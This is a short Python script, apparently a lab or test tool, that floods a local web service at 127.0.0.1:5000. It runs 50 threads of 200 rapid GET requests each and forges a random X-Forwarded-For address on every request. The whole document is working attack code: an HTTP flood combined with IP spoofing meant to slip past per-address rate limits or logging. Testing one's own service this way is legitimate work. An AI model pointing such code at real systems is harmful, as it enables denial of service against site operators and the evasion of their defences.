import requests
import threading
import time
import random

target = "http://127.0.0.1:5000"


def attack():
    for _ in range(200):
        try:
            fake_ip = f"192.168.1.{random.randint(1,254)}"

            headers = {
                "X-Forwarded-For": fake_ip
            }

            requests.get(target, headers=headers)

        except:
            pass

        time.sleep(0.005)


threads = []

for i in range(50):
    t = threading.Thread(target=attack)
    t.start()
    threads.append(t)

for t in threads:
    t.join()